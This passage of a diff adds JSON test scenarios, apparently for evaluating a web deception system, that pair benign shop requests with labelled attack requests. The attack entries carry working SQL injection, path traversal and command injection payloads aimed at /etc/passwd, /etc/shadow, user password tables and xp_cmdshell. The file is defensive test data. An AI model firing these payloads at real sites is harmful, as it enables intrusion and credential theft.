+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-037",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_037",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/categories?include_empty=false",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.137"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-038",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_038",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/user/cart",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "cookie": "session_token=usr_9281a8c7b",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.138"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-039",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_039",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/api/v1/user/cart/items",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/json",
+          "accept": "application/json"
+        },
+        "body": "{\"item_id\": 205, \"quantity\": 1}",
+        "client_ip": "192.168.10.139"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-040",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_040",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/health",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Prometheus/2.45.0",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.140"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-041",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_041",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/metrics",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Prometheus/2.45.0",
+          "accept": "text/plain"
+        },
+        "body": "",
+        "client_ip": "192.168.10.141"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-042",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_042",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/about.html",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.142"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-043",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_043",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/contact.html",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.1)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.143"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-044",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_044",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/contact.html",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "nombre=Ana&mensaje=Consulta+sobre+el+pedido&email=ana%40correo.es",
+        "client_ip": "192.168.10.144"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-045",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_045",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/terms-and-conditions",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.145"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-046",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_046",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/privacy-policy",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.146"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-047",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_047",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/orders/ORD-98214",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "cookie": "auth_token=tok_44921",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.147"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-048",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_048",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/help/faq?category=shipping",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 10.0)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.148"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-049",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_049",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/shipping/rates?postal_code=28001",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.149"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-050",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_050",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/confirmacion.jsp?pedido=10492",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.150"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-001",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_001",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux)",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "id=2&nombre=Jamon+Iberico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito",
+        "client_ip": "10.0.50.101"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-002",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_002",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/autenticacion.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES)",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "login=admin%27+OR+1%3D1--&password=cualquiera&B1=Entrar",
+        "client_ip": "10.0.50.102"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-003",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_003",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=1%20UNION%20SELECT%20null,username,password%20FROM%20usuarios--",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; U; Linux i686)"
+        },
+        "body": "",
+        "client_ip": "10.0.50.103"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-004",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_004",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=1%27%20OR%20%271%27=%271",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.104"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-005",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_005",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/registro.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "nombre=hacker&apellidos=%27+UNION+SELECT+version()%2Cuser()--&telefono=123&email=h%40h.com&password=pass&passwordConfirm=pass&B1=Registrar",
+        "client_ip": "10.0.50.105"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-006",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_006",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/miembros/editar.jsp?id=1;WAITFOR%20DELAY%20%270:0:5%27--",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "cookie": "JSESSIONID=BAD78912"
+        },
+        "body": "",
+        "client_ip": "10.0.50.106"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-007",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_007",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/products?category=1%27%20HAVING%201=1--",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "sqlmap/1.6#stable (https://sqlmap.org)",
+          "accept": "*/*"
+        },
+        "body": "",
+        "client_ip": "10.0.50.107"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-008",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_008",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/api/v1/auth/login",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/json"
+        },
+        "body": "{\"user\": \"' or ''='\", \"pass\": \"' or ''='\"}",
+        "client_ip": "10.0.50.108"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-009",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_009",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=%27%20EXEC%20xp_cmdshell(%27net%20user%27)--",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.109"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-010",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_010",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "id=1%27+AND+(SELECT+count(*)+FROM+information_schema.tables)>0+AND+%271%27=%271&nombre=Test&precio=10&cantidad=1",
+        "client_ip": "10.0.50.110"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-011",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_011",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/orders?sort=id;SELECT%20pg_sleep(5);--",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "10.0.50.111"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-012",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_012",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "SQLI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=1%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),1,1))=97",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.112"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-013",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_013",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=../../../../etc/passwd",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.113"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-014",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_014",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=..%2F..%2F..%2F..%2Fetc%2Fshadow",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.114"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-015",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_015",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/anadir.jsp?item=..\\..\\..\\windows\\system32\\cmd.exe",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.115"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-016",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_016",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/imagenes/..%2f..%2fWEB-INF%2fweb.xml",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Nikto/2.1.6"
+        },
+        "body": "",
+        "client_ip": "10.0.50.116"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-017",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_017",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=....//....//....//etc/passwd",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.117"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-018",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_018",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.118"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-019",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_019",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/files?path=/proc/self/environ",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.119"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-020",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_020",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/index.jsp?page=file:///etc/hosts",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.120"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-021",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_021",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/anadir.jsp?file=..%252f..%252f..%252fetc%252fpasswd",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.121"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-022",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_022",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "TRAVERSAL",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/download?filename=../../../../var/log/apache2/access.log",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "curl/7.88.1"
+        },
+        "body": "",
+        "client_ip": "10.0.50.122"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-023",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_023",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=test%3Bcat%20/etc/passwd",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0"
+        },
+        "body": "",
+        "client_ip": "10.0.50.123"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-024",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_024",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
+        "expected_safety_constraint": "MUST_DIVERT_TO_DECEPTION"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/api/v1/system/ping",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0",
+          "content-type": "application/x-www-form-urlencoded"
+        },
+        "body": "host=127.0.0.1%7Cid",
+        "client_ip": "10.0.50.124"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-ATK-025",
+      "split": "external_test",
+      "session_id": "sess_ext_atk_025",
+      "source_dataset": "CSIC_2010_ANOMALOUS_AND_OWASP_CRS",
+      "ground_truth": {
+        "label": "MALICIOUS",
+        "is_attack": true,
+        "category": "CMDI",
